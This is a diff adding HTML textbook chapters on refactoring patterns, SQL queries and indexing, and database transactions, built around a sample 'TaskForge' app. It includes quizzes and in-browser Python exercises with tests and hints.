+
+<pre style="overflow-x:auto"><code># Before: one large function doing four things
+def process_order(order):
+    if not order.get("items"):
+        raise ValueError("No items")
+    if order["total"] &lt; 0:
+        raise ValueError("Negative total")
+    tax = order["total"] * 0.08
+    order["tax"] = tax
+    order["grand_total"] = order["total"] + tax
+    db.save(order)
+    email.send(order["customer"], f"Confirmed: ${order['grand_total']}")
+
+# After: each step has a clear name
+def process_order(order):
+    validate_order(order)
+    apply_tax(order)
+    db.save(order)
+    notify_customer(order)
+
+def validate_order(order):
+    if not order.get("items"):
+        raise ValueError("No items")
+    if order["total"] &lt; 0:
+        raise ValueError("Negative total")
+
+def apply_tax(order, rate=0.08):
+    order["tax"] = order["total"] * rate
+    order["grand_total"] = order["total"] + order["tax"]
+
+def notify_customer(order):
+    email.send(order["customer"], f"Confirmed: ${order['grand_total']}")</code></pre>
+
+<p><strong>Replace Conditional with Polymorphism</strong> is especially powerful when you have long <code>if/elif</code> chains based on a type field &mdash; exactly what we fixed with OCP above.</p>
+
+<p>The <strong>Strangler Fig Pattern</strong> is for large-scale refactoring: instead of rewriting a system from scratch, you gradually build the new system alongside the old one, routing traffic to the new code piece by piece until the old system is fully replaced. The name comes from the strangler fig tree, which grows around a host tree and eventually replaces it.</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">TaskForge Connection</div>
+<p>Refactor TaskForge to use the Strategy pattern for storage. Create a <code>StorageBackend</code> abstract base class and implement both a <code>DictBackend</code> (for fast testing) and a <code>SQLiteBackend</code> (for production). Your <code>TaskManager</code> should accept any backend via constructor injection. This single change makes TaskForge dramatically easier to test.</p>
+</div>
+
+<div class="pq">"Make it work, make it right, make it fast &mdash; in that order." &mdash; Kent Beck</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">Try This Now &mdash; Spot the Smell</div>
+<p>Look at your TaskForge codebase. Find one God Class (a file or class doing too many things). Write down which responsibilities could be split out. You do not need to refactor yet &mdash; just practice identifying the smell.</p>
+</div>
+
+<!-- Ch28 Quiz -->
+<div class="quiz" data-ch="28" data-ex="solid-violation">
+  <h4>Knowledge Check</h4>
+  <p>A class called <code>UserManager</code> handles user registration, password hashing, sending welcome emails, and generating analytics reports. Which SOLID principle does this most clearly violate?</p>
+  <div class="quiz-options">
+    <button class="quiz-option" data-correct="true">Single Responsibility Principle &mdash; the class has multiple reasons to change</button>
+    <button class="quiz-option" data-correct="false">Open/Closed Principle &mdash; it is not extensible</button>
+    <button class="quiz-option" data-correct="false">Liskov Substitution Principle &mdash; subtypes cannot replace it</button>
+    <button class="quiz-option" data-correct="false">Dependency Inversion Principle &mdash; it depends on concrete classes</button>
+  </div>
+  <div class="quiz-feedback"></div>
+</div>
+
+<!-- Ch28 Pyodide Exercise -->
+<div class="exercise" data-type="pyodide" data-ch="28" data-ex="strategy-pattern">
+  <div class="exercise-header">
+    <h4>Exercise: Implement the Strategy Pattern</h4>
+    <span class="exercise-status"></span>
+  </div>
+  <p class="exercise-prompt">Create a <code>StorageBackend</code> base class with abstract methods <code>save(key, value)</code>, <code>load(key)</code>, and <code>list_all()</code>. Then implement <code>DictStorage</code> (stores in a dictionary) and <code>ListStorage</code> (stores in a list of tuples). Finally, create a <code>TaskManager</code> class whose constructor accepts any backend. Its <code>add_task(task_id, title)</code> should save <code>{"title": title}</code>, and <code>get_task(task_id)</code> should load it.</p>
+  <div class="exercise-editor">
+    <script type="text/plain" class="starter-code">
+from abc import ABC, abstractmethod
+
+class StorageBackend(ABC):
+    @abstractmethod
+    def save(self, key, value):
+        pass
+
+    @abstractmethod
+    def load(self, key):
+        pass
+
+    @abstractmethod
+    def list_all(self):
+        pass
+
+class DictStorage(StorageBackend):
+    # TODO: implement using a dict
+    pass
+
+class ListStorage(StorageBackend):
+    # TODO: implement using a list of (key, value) tuples
+    pass
+
+class TaskManager:
+    # TODO: accept a backend, implement add_task and get_task
+    pass
+    </script>
+    <script type="text/plain" class="test-code">
+# Test DictStorage
+ds = DictStorage()
+ds.save("t1", {"title": "Buy milk"})
+ds.save("t2", {"title": "Fix bug"})
+assert ds.load("t1") == {"title": "Buy milk"}, "DictStorage load failed"
+assert ds.load("t2") == {"title": "Fix bug"}, "DictStorage load t2 failed"
+assert len(ds.list_all()) == 2, "DictStorage list_all should return 2 items"
+
+# Test ListStorage
+ls = ListStorage()
+ls.save("t1", {"title": "Buy milk"})
+ls.save("t2", {"title": "Fix bug"})
+assert ls.load("t1") == {"title": "Buy milk"}, "ListStorage load failed"
+assert ls.load("t2") == {"title": "Fix bug"}, "ListStorage load t2 failed"
+assert len(ls.list_all()) == 2, "ListStorage list_all should return 2 items"
+
+# Test TaskManager with DictStorage
+tm_dict = TaskManager(DictStorage())
+tm_dict.add_task("a1", "Write docs")
+assert tm_dict.get_task("a1") == {"title": "Write docs"}, "TaskManager+DictStorage failed"
+
+# Test TaskManager with ListStorage
+tm_list = TaskManager(ListStorage())
+tm_list.add_task("b1", "Deploy app")
+assert tm_list.get_task("b1") == {"title": "Deploy app"}, "TaskManager+ListStorage failed"
+
+# Verify both backends are interchangeable
+assert isinstance(tm_dict._backend, StorageBackend), "Backend must inherit StorageBackend"
+assert isinstance(tm_list._backend, StorageBackend), "Backend must inherit StorageBackend"
+print("All Strategy pattern tests passed!")
+    </script>
+  </div>
+  <div class="exercise-controls">
+    <button class="ex-run">Run</button>
+    <button class="ex-check">Check</button>
+    <button class="ex-hint" data-level="0">Hint</button>
+    <button class="ex-reset">Reset</button>
+  </div>
+  <div class="exercise-output"></div>
+  <div class="exercise-tests"></div>
+  <div class="exercise-hints">
+    <p class="hint">DictStorage: use self._store = {} in __init__. save() sets self._store[key] = value. load() returns self._store.get(key). list_all() returns list(self._store.values()).</p>
+    <p class="hint">ListStorage: use self._store = [] in __init__. save() appends (key, value). load() iterates the list to find the matching key. list_all() returns [v for _, v in self._store].</p>
+    <p class="hint">TaskManager.__init__ takes a backend parameter stored as self._backend. add_task calls self._backend.save(task_id, {"title": title}). get_task calls self._backend.load(task_id).</p>
+  </div>
+</div>
+
+</section>
+
+
+<!-- ===== CH 29 ===== -->
+<section id="ch29" data-ch="29">
+<h2><span class="ch-label">Chapter 29</span> SQL &amp; Query Mastery</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">Why This Matters Now</div>
+<p>In Chapter 15 you learned enough SQL to create tables and run basic queries. In the real world you will encounter databases with millions of rows, complex relationships, and performance requirements. This chapter takes you from &ldquo;I can write SELECT&rdquo; to &ldquo;I can write efficient, complex queries and understand why they perform the way they do.&rdquo;</p>
+</div>
+
+<h3>JOINs &mdash; Connecting Tables</h3>
+
+<p>Real databases spread data across multiple tables to avoid duplication (normalisation). <strong>JOINs</strong> are how you reconnect that data in queries. Understanding the different JOIN types is essential.</p>
+
+<h4>INNER JOIN</h4>
+
+<p>Returns only rows that have a match in <em>both</em> tables. If a task has no category, it is excluded entirely.</p>
+
+<pre style="overflow-x:auto"><code>-- Tasks with their category names (only matched rows)
+SELECT tasks.title, categories.name AS category
+FROM tasks
+INNER JOIN categories ON tasks.category_id = categories.id;</code></pre>
+
+<p>Think of INNER JOIN as the intersection of two sets. Only matching pairs appear in the result.</p>
+
+<h4>LEFT OUTER JOIN</h4>
+
+<p>Returns all rows from the <em>left</em> table, even if there is no match in the right table. Unmatched columns from the right table become NULL.</p>
+
+<pre style="overflow-x:auto"><code>-- ALL tasks, including those without a category
+SELECT tasks.title, categories.name AS category
+FROM tasks
+LEFT JOIN categories ON tasks.category_id = categories.id;
+
+-- Result includes:
+-- "Fix login bug"    | "Bugs"
+-- "Unassigned task"  | NULL    &larr; no category, still included</code></pre>
+
+<h4>CROSS JOIN</h4>
+
+<p>Returns the <strong>Cartesian product</strong> &mdash; every row from the first table paired with every row from the second. If table A has 3 rows and table B has 4 rows, the result has 12 rows. Rarely needed, but useful for generating all possible combinations.</p>
+
+<pre style="overflow-x:auto"><code>-- Every task paired with every user (for scheduling matrix)
+SELECT tasks.title, users.name
+FROM tasks
+CROSS JOIN users;</code></pre>
+
+<h4>Self-Join</h4>
+
+<p>A table joined to itself. Useful for hierarchical data like tasks that have subtasks.</p>
+
+<pre style="overflow-x:auto"><code>-- Find tasks and their parent tasks
+SELECT child.title AS subtask, parent.title AS parent_task
+FROM tasks AS child
+INNER JOIN tasks AS parent ON child.parent_id = parent.id;</code></pre>
+
+<h3>Subqueries &amp; CTEs</h3>
+
+<h4>Subqueries</h4>
+
+<p>A <strong>subquery</strong> is a query nested inside another query. An <strong>uncorrelated subquery</strong> runs once independently. A <strong>correlated subquery</strong> runs once per row of the outer query and is therefore slower, but sometimes necessary.</p>
+
+<pre style="overflow-x:auto"><code>-- Uncorrelated: find tasks with above-average priority score
+SELECT title, priority_score
+FROM tasks
+WHERE priority_score &gt; (SELECT AVG(priority_score) FROM tasks);
+
+-- Correlated: find each user's most recent task
+SELECT t.title, t.created_at, t.user_id
+FROM tasks t
+WHERE t.created_at = (
+    SELECT MAX(t2.created_at)
+    FROM tasks t2
+    WHERE t2.user_id = t.user_id  -- References outer query
+);</code></pre>
+
+<h4>Common Table Expressions (CTEs)</h4>
+
+<p>A <strong>CTE</strong> uses the <code>WITH</code> clause to define a temporary named result set. CTEs make complex queries readable by breaking them into logical steps.</p>
+
+<pre style="overflow-x:auto"><code>-- Find categories with more than 5 high-priority tasks
+WITH high_priority AS (
+    SELECT category_id, COUNT(*) AS cnt
+    FROM tasks
+    WHERE priority = 'high'
+    GROUP BY category_id
+)
+SELECT categories.name, high_priority.cnt
+FROM high_priority
+INNER JOIN categories ON high_priority.category_id = categories.id
+WHERE high_priority.cnt &gt; 5;</code></pre>
+
+<p>CTEs are far more readable than nested subqueries, and you can reference the same CTE multiple times in the main query.</p>
+
+<h3>Window Functions</h3>
+
+<p><strong>Window functions</strong> perform calculations across a set of rows related to the current row, <em>without</em> collapsing the result like <code>GROUP BY</code> does. They are one of the most powerful features of modern SQL.</p>
+
+<pre style="overflow-x:auto"><code>-- ROW_NUMBER: sequential number within each category
+SELECT title, category_id, priority_score,
+       ROW_NUMBER() OVER (
+           PARTITION BY category_id
+           ORDER BY priority_score DESC
+       ) AS rank_in_category
+FROM tasks;
+
+-- RANK: ties get the same rank (with gaps after)
+SELECT title, priority_score,
+       RANK() OVER (ORDER BY priority_score DESC) AS rank
+FROM tasks;
+
+-- LAG / LEAD: access the previous/next row's value
+SELECT title, created_at,
+       LAG(created_at) OVER (ORDER BY created_at) AS prev_date
+FROM tasks;</code></pre>
+
+<p>The <code>OVER</code> clause defines the window: <code>PARTITION BY</code> splits rows into groups (like GROUP BY but without collapsing), and <code>ORDER BY</code> defines the sort order within each partition.</p>
+
+<h3>Indexing &mdash; Making Queries Fast</h3>
+
+<p>Without indexes, every query scans the entire table (a &ldquo;full table scan&rdquo;). An <strong>index</strong> is a separate data structure that lets the database find rows without scanning everything. Think of it as the index at the back of a textbook.</p>
+
+<h4>B-Tree Indexes</h4>
+
+<p>The most common index type is the <strong>B-tree</strong> (balanced tree). It keeps keys sorted in a tree structure where each node points to ranges of values. Looking up a value is O(log n) instead of O(n).</p>
+
+<!-- B-tree SVG Diagram -->
+<svg viewBox="0 0 700 310" aria-label="B-tree index structure showing how TaskForge task IDs are organized in a tree for efficient lookup. Root node contains keys 20 and 40, branching to leaf nodes containing task ID ranges." style="width:100%;max-width:700px;margin:1.5rem auto;display:block">
+  <!-- Root node -->
+  <rect x="265" y="10" width="170" height="44" rx="6" class="node-accent" stroke="var(--accent)" stroke-width="2"/>
+  <text x="350" y="37" class="label-text" text-anchor="middle" font-size="14" font-weight="600">20 | 40</text>
+
+  <!-- Level 2 nodes -->
+  <rect x="60" y="95" width="150" height="44" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="135" y="122" class="label-text" text-anchor="middle" font-size="13">5 | 10 | 15</text>
+
+  <rect x="275" y="95" width="150" height="44" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="350" y="122" class="label-text" text-anchor="middle" font-size="13">25 | 30 | 35</text>
+
+  <rect x="490" y="95" width="150" height="44" rx="6" class="node-fill" stroke="var(--accent)" stroke-width="1.5"/>
+  <text x="565" y="122" class="label-text" text-anchor="middle" font-size="13">45 | 50 | 55</text>
+
+  <!-- Leaf nodes -->
+  <rect x="12" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="50" y="215" class="sub-text" text-anchor="middle" font-size="10">1,2,3,4</text>
+
+  <rect x="98" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="136" y="215" class="sub-text" text-anchor="middle" font-size="10">6,7,8,9</text>
+
+  <rect x="184" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="222" y="215" class="sub-text" text-anchor="middle" font-size="10">11..14</text>
+
+  <rect x="290" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="328" y="215" class="sub-text" text-anchor="middle" font-size="10">21..24</text>
+
+  <rect x="376" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="414" y="215" class="sub-text" text-anchor="middle" font-size="10">26..29</text>
+
+  <rect x="492" y="195" width="76" height="32" rx="4" class="node-fill" stroke="var(--a5)" stroke-width="1"/>
+  <text x="530" y="215" class="sub-text" text-anchor="middle" font-size="10">31..34</text>
+
+  <!-- Arrows root to level 2 -->
+  <line x1="300" y1="54" x2="175" y2="95" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="350" y1="54" x2="350" y2="95" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="400" y1="54" x2="525" y2="95" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+
+  <!-- Arrows level 2 to leaves -->
+  <line x1="100" y1="139" x2="55" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+  <line x1="135" y1="139" x2="133" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+  <line x1="175" y1="139" x2="218" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+
+  <line x1="315" y1="139" x2="325" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+  <line x1="350" y1="139" x2="410" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+  <line x1="385" y1="139" x2="525" y2="195" class="arrow" stroke="var(--a5)" stroke-width="1" marker-end="url(#arrowhead-muted)"/>
+
+  <!-- Search path highlight -->
+  <text x="350" y="260" class="sub-text" text-anchor="middle" font-size="12" fill="var(--accent)" font-weight="500">Lookup task #27: Root &rarr; middle child &rarr; leaf &rarr; found!</text>
+  <text x="350" y="280" class="sub-text" text-anchor="middle" font-size="11">Only 3 node reads instead of scanning all 55 rows</text>
+</svg>
+
+<pre style="overflow-x:auto"><code>-- Single-column index on the column you filter by most
+CREATE INDEX idx_tasks_priority ON tasks(priority);
+
+-- Composite index: useful when filtering by both columns together
+CREATE INDEX idx_tasks_cat_priority ON tasks(category_id, priority);
+
+-- Column order matters! This index helps:
+--   WHERE category_id = 5 AND priority = 'high'  (both columns)
+--   WHERE category_id = 5                         (leftmost column)
+-- But NOT:
+--   WHERE priority = 'high'  (can't skip the first column)</code></pre>
+
+<h4>Covering Indexes</h4>
+
+<p>A <strong>covering index</strong> includes all columns the query needs, so the database answers the query entirely from the index without touching the main table.</p>
+
+<pre style="overflow-x:auto"><code>-- If this is your most common query:
+SELECT title, priority FROM tasks WHERE category_id = 5;
+
+-- This covering index answers it without touching the table:
+CREATE INDEX idx_covering ON tasks(category_id, title, priority);</code></pre>
+
+<h4>When Indexes Hurt</h4>
+
+<p>Indexes are not free. Every index adds overhead to INSERT, UPDATE, and DELETE operations (the index must be updated too) and consumes storage. On write-heavy tables with rare reads, too many indexes can actually slow things down. Profile before you index blindly.</p>
+
+<h3>Query Optimisation</h3>
+
+<h4>EXPLAIN &mdash; Reading Query Plans</h4>
+
+<p>The <code>EXPLAIN</code> command shows you <em>how</em> the database will execute a query.</p>
+
+<pre style="overflow-x:auto"><code>EXPLAIN QUERY PLAN
+SELECT tasks.title, categories.name
+FROM tasks
+INNER JOIN categories ON tasks.category_id = categories.id
+WHERE tasks.priority = 'high';
+
+-- Output might show:
+-- SCAN TABLE tasks           &larr; Full table scan! No index on priority
+-- SEARCH TABLE categories USING INTEGER PRIMARY KEY  &larr; Good, using PK</code></pre>
+
+<p>Look for the word <strong>SCAN</strong> (bad on large tables &mdash; reading every row) vs. <strong>SEARCH</strong> or <strong>USING INDEX</strong> (good &mdash; using an index). If you see SCAN on a large table with a WHERE clause, you probably need an index.</p>
+
+<div role="note" class="callout warn">
+<div class="callout-title">Engineering Angle: Reading EXPLAIN Output Is a Daily Skill</div>
+<p>In production, slow queries are one of the most common causes of application downtime. The ability to run EXPLAIN, interpret the output, and add the right index is something you will use constantly. Do not skip this section &mdash; practise it on every query you write.</p>
+</div>
+
+<h4>The N+1 Problem</h4>
+
+<p>The <strong>N+1 problem</strong> occurs when your code makes one query to fetch a list, then N additional queries to fetch related data for each item. It is extremely common and extremely wasteful.</p>
+
+<pre style="overflow-x:auto"><code># THE N+1 PROBLEM
+# 1 query to get all categories
+categories = db.execute("SELECT * FROM categories").fetchall()
+
+for cat in categories:
+    # N queries, one per category!
+    tasks = db.execute(
+        "SELECT * FROM tasks WHERE category_id = ?", (cat["id"],)
+    ).fetchall()
+    print(f"{cat['name']}: {len(tasks)} tasks")
+
+# If there are 100 categories, that's 101 total queries!
+
+# THE FIX: single JOIN query
+results = db.execute("""
+    SELECT categories.name, COUNT(tasks.id) AS task_count
+    FROM categories
+    LEFT JOIN tasks ON tasks.category_id = categories.id
+    GROUP BY categories.id
+""").fetchall()
+# 1 query instead of 101!</code></pre>
+
+<h3>Normalisation</h3>
+
+<p><strong>Normalisation</strong> organises data to reduce redundancy. There are several &ldquo;normal forms,&rdquo; each building on the last.</p>
+
+<p><strong>First Normal Form (1NF):</strong> Every column contains atomic (single) values. No lists or repeating groups.</p>
+
+<pre style="overflow-x:auto"><code>-- VIOLATES 1NF: tags column contains a comma-separated list
+-- | id | title    | tags              |
+-- | 1  | Fix bug  | "urgent,security" |
+
+-- 1NF FIX: separate table for tags
+-- tasks: | id | title   |
+-- tags:   | id | task_id | tag      |
+--         | 1  | 1       | urgent   |
+--         | 2  | 1       | security |</code></pre>
+
+<p><strong>Second Normal Form (2NF):</strong> Satisfies 1NF, and every non-key column depends on the <em>entire</em> primary key (relevant for composite keys).</p>
+
+<p><strong>Third Normal Form (3NF):</strong> Satisfies 2NF, and no non-key column depends on another non-key column (no transitive dependencies).</p>
+
+<pre style="overflow-x:auto"><code>-- VIOLATES 3NF: city depends on zip_code, not on the primary key
+-- | user_id | name  | zip_code | city     |
+
+-- 3NF FIX: separate zip_codes table
+-- users:     | user_id | name  | zip_code |
+-- zip_codes: | zip_code | city            |</code></pre>
+
+<p><strong>When to denormalise:</strong> Read-heavy analytics and reporting queries may benefit from storing redundant data to avoid expensive JOINs. This is a deliberate trade-off: faster reads at the cost of more complex writes and potential data inconsistency.</p>
+
+<div role="note" class="callout info">
+<div class="callout-title">TaskForge Connection</div>
+<p>Add indexes to the TaskForge database: an index on <code>tasks.priority</code>, a composite index on <code>tasks(category_id, priority)</code>, and a covering index for your most common query. Run <code>EXPLAIN QUERY PLAN</code> before and after to see the difference. Also, find and fix any N+1 queries in your API routes.</p>
+</div>
+
+<div role="note" class="callout ok">
+<div class="callout-title">Micro-Exercise: Spot the N+1</div>
+<p>Identify the N+1 problem in this pseudocode:</p>
+<pre style="overflow-x:auto"><code>users = db.query("SELECT * FROM users")
+for user in users:
+    tasks = db.query(f"SELECT * FROM tasks WHERE user_id = {user.id}")
+    user.task_count = len(tasks)</code></pre>
+<p>Write the single JOIN query that replaces it:</p>
+<pre style="overflow-x:auto"><code>SELECT users.*, COUNT(tasks.id) AS task_count
+FROM users
+LEFT JOIN tasks ON tasks.user_id = users.id
+GROUP BY users.id</code></pre>
+</div>
+
+<!-- Ch29 Pyodide Exercise -->
+<div class="exercise" data-type="pyodide" data-ch="29" data-ex="sql-joins-windows">
+  <div class="exercise-header">
+    <h4>Exercise: SQL JOINs &amp; Window Functions</h4>
+    <span class="exercise-status"></span>
+  </div>
+  <p class="exercise-prompt">Using Python&rsquo;s <code>sqlite3</code>, create tables, insert data, then write queries using JOINs and window functions. Complete each function so it returns the correct result.</p>
+  <div class="exercise-editor">
+    <script type="text/plain" class="starter-code">
+import sqlite3
+
+def setup_database():
+    """Create tables and insert sample data. Return the connection."""
+    conn = sqlite3.connect(":memory:")
+    conn.row_factory = sqlite3.Row
+    c = conn.cursor()
+    c.execute("""CREATE TABLE categories (
+        id INTEGER PRIMARY KEY, name TEXT NOT NULL
+    )""")
+    c.execute("""CREATE TABLE tasks (
+        id INTEGER PRIMARY KEY, title TEXT NOT NULL,
+        priority INTEGER DEFAULT 3, category_id INTEGER,
+        FOREIGN KEY (category_id) REFERENCES categories(id)
+    )""")
+    c.executemany("INSERT INTO categories (id, name) VALUES (?, ?)", [
+        (1, "Bugs"), (2, "Features"), (3, "Docs")
+    ])
+    c.executemany(
+        "INSERT INTO tasks (id, title, priority, category_id) VALUES (?, ?, ?, ?)", [
+        (1, "Fix login crash", 5, 1),
+        (2, "Add dark mode", 3, 2),
+        (3, "Update README", 2, 3),
+        (4, "Fix timeout bug", 4, 1),
+        (5, "Search feature", 4, 2),
+        (6, "Orphan task", 3, None),
+    ])
+    conn.commit()
+    return conn
+
+def query_inner_join(conn):
+    """Return list of (title, category_name) for tasks WITH a category.
+    Use INNER JOIN. Should return 5 rows (orphan excluded)."""
+    # TODO
+    pass
+
+def query_left_join(conn):
+    """Return list of (title, category_name) for ALL tasks.
+    Tasks without a category should have None for category_name.
+    Should return 6 rows."""
+    # TODO
+    pass
+
+def query_window_rank(conn):
+    """Return list of (title, category_id, priority, rank_in_category).
+    Rank by priority DESC within each category using ROW_NUMBER().
+    Only include tasks that HAVE a category."""
+    # TODO
+    pass
+
+conn = setup_database()
+    </script>
+    <script type="text/plain" class="test-code">
+inner = query_inner_join(conn)
+assert inner is not None, "query_inner_join returned None"
+assert len(inner) == 5, f"INNER JOIN should return 5 rows, got {len(inner)}"
+titles = [r[0] for r in inner]
+assert "Orphan task" not in titles, "INNER JOIN should exclude orphan task"
+
+left = query_left_join(conn)
+assert left is not None, "query_left_join returned None"
+assert len(left) == 6, f"LEFT JOIN should return 6 rows, got {len(left)}"
+orphan = [r for r in left if r[0] == "Orphan task"]
+assert len(orphan) == 1, "Orphan task should appear in LEFT JOIN"
+assert orphan[0][1] is None, "Orphan task's category should be None"
+
+ranked = query_window_rank(conn)
+assert ranked is not None, "query_window_rank returned None"
+assert len(ranked) == 5, f"Window query should return 5 rows, got {len(ranked)}"
+cat1 = [r for r in ranked if r[1] == 1]
+assert cat1[0][3] == 1, "Highest priority in Bugs should be rank 1"
+assert cat1[0][0] == "Fix login crash", "Fix login crash should be rank 1 in Bugs"
+print("All SQL tests passed!")
+    </script>
+  </div>
+  <div class="exercise-controls">
+    <button class="ex-run">Run</button>
+    <button class="ex-check">Check</button>
+    <button class="ex-hint" data-level="0">Hint</button>
+    <button class="ex-reset">Reset</button>
+  </div>
+  <div class="exercise-output"></div>
+  <div class="exercise-tests"></div>
+  <div class="exercise-hints">
+    <p class="hint">For INNER JOIN: <code>SELECT tasks.title, categories.name FROM tasks INNER JOIN categories ON tasks.category_id = categories.id</code>. Use <code>conn.execute(sql).fetchall()</code>.</p>
+    <p class="hint">For LEFT JOIN: change INNER JOIN to LEFT JOIN. This includes tasks with NULL category_id.</p>
+    <p class="hint">For window: <code>SELECT title, category_id, priority, ROW_NUMBER() OVER (PARTITION BY category_id ORDER BY priority DESC) AS rank FROM tasks WHERE category_id IS NOT NULL</code></p>
+  </div>
+</div>
+
+</section>
+
+
+<!-- ===== CH 30 ===== -->
+<section id="ch30" data-ch="30">
+<h2><span class="ch-label">Chapter 30</span> Transactions, NoSQL &amp; Data Evolution</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">Why This Matters Now</div>
+<p>What happens when two users update the same task simultaneously? What if the server crashes halfway through saving related records? Transactions protect your data from these dangers. And sometimes relational databases are not the right tool at all &mdash; understanding NoSQL gives you the vocabulary to choose wisely.</p>
+</div>
+
+<h3>Transactions &amp; ACID</h3>
+
+<p>A <strong>transaction</strong> is a group of database operations that must either all succeed or all fail. There is no in-between. The properties that guarantee this are called <strong>ACID</strong>:</p>
+
+<p><strong>Atomicity:</strong> All operations in the transaction succeed, or none of them do. If step 3 of 5 fails, steps 1 and 2 are rolled back as if they never happened.</p>
+
+<p><strong>Consistency:</strong> A transaction moves the database from one valid state to another. Constraints (foreign keys, unique rules, check constraints) are always enforced.</p>
+
+<p><strong>Isolation:</strong> Concurrent transactions do not interfere with each other. Each sees the database as if it were the only one running (the degree of isolation is configurable).</p>
+
+<p><strong>Durability:</strong> Once committed, data survives crashes, power failures, and restarts.</p>
+
+<!-- ACID SVG Diagram -->
+<svg viewBox="0 0 700 290" aria-label="ACID properties illustrated with a bank transfer example: debit from Account A and credit to Account B must both succeed or both fail as a single atomic unit" style="width:100%;max-width:700px;margin:1.5rem auto;display:block">
+  <text x="350" y="22" class="label-text" text-anchor="middle" font-size="14" font-weight="600">Bank Transfer: $100 from Account A to Account B</text>
+
+  <rect x="40" y="42" width="155" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="117" y="66" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Account A</text>
+  <text x="117" y="88" class="sub-text" text-anchor="middle" font-size="12">Balance: $500</text>
+
+  <rect x="505" y="42" width="155" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="582" y="66" class="label-text" text-anchor="middle" font-size="13" font-weight="600">Account B</text>
+  <text x="582" y="88" class="sub-text" text-anchor="middle" font-size="12">Balance: $200</text>
+
+  <rect x="160" y="130" width="380" height="85" rx="10" class="node-accent" stroke="var(--accent)" stroke-width="2" stroke-dasharray="6,3"/>
+  <text x="350" y="152" class="label-text" text-anchor="middle" font-size="12" font-weight="600">BEGIN TRANSACTION</text>
+  <text x="350" y="172" class="sub-text" text-anchor="middle" font-size="11">UPDATE accounts SET balance = 400 WHERE id = 'A'</text>
+  <text x="350" y="190" class="sub-text" text-anchor="middle" font-size="11">UPDATE accounts SET balance = 300 WHERE id = 'B'</text>
+  <text x="350" y="208" class="label-text" text-anchor="middle" font-size="12" font-weight="600">COMMIT</text>
+
+  <line x1="195" y1="102" x2="260" y2="130" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+  <line x1="505" y1="102" x2="440" y2="130" class="arrow" stroke="var(--accent)" stroke-width="1.5" marker-end="url(#arrowhead)"/>
+
+  <text x="100" y="255" class="label-text" text-anchor="middle" font-size="12" font-weight="600" fill="var(--accent)">Atomicity</text>
+  <text x="100" y="275" class="sub-text" text-anchor="middle" font-size="10">Both or neither</text>
+  <text x="280" y="255" class="label-text" text-anchor="middle" font-size="12" font-weight="600" fill="var(--accent)">Consistency</text>
+  <text x="280" y="275" class="sub-text" text-anchor="middle" font-size="10">Totals always balance</text>
+  <text x="450" y="255" class="label-text" text-anchor="middle" font-size="12" font-weight="600" fill="var(--accent)">Isolation</text>
+  <text x="450" y="275" class="sub-text" text-anchor="middle" font-size="10">Others see old or new</text>
+  <text x="620" y="255" class="label-text" text-anchor="middle" font-size="12" font-weight="600" fill="var(--accent)">Durability</text>
+  <text x="620" y="275" class="sub-text" text-anchor="middle" font-size="10">Survives crashes</text>
+</svg>
+
+<pre style="overflow-x:auto"><code>import sqlite3
+
+conn = sqlite3.connect("bank.db")
+cursor = conn.cursor()
+
+try:
+    cursor.execute("UPDATE accounts SET balance = balance - 100 WHERE id = 'A'")
+    cursor.execute("UPDATE accounts SET balance = balance + 100 WHERE id = 'B'")
+    conn.commit()    # Both succeed
+except Exception:
+    conn.rollback()  # Both fail &mdash; Account A keeps its money</code></pre>
+
+<h3>Isolation Levels</h3>
+
+<p>Isolation is not binary &mdash; there is a spectrum. Stricter isolation means more safety but less concurrency.</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>Transaction isolation levels and their trade-offs</caption>
+<thead><tr><th>Isolation Level</th><th>Dirty Read</th><th>Non-Repeatable Read</th><th>Phantom Read</th><th>Use Case</th></tr></thead>
+<tbody>
+<tr><td><strong>Read Uncommitted</strong></td><td>Possible</td><td>Possible</td><td>Possible</td><td>Rarely used; maximum speed</td></tr>
+<tr><td><strong>Read Committed</strong></td><td>Prevented</td><td>Possible</td><td>Possible</td><td>Default in PostgreSQL</td></tr>
+<tr><td><strong>Repeatable Read</strong></td><td>Prevented</td><td>Prevented</td><td>Possible</td><td>Default in MySQL; financial reports</td></tr>
+<tr><td><strong>Serializable</strong></td><td>Prevented</td><td>Prevented</td><td>Prevented</td><td>Banking, critical systems</td></tr>
+</tbody>
+</table>
+</div>
+
+<p><strong>Dirty read:</strong> Transaction A reads data that Transaction B modified but has not yet committed. If B rolls back, A read data that never truly existed.</p>
+
+<p><strong>Non-repeatable read:</strong> Transaction A reads a row, B modifies and commits it, then A re-reads and gets a different value.</p>
+
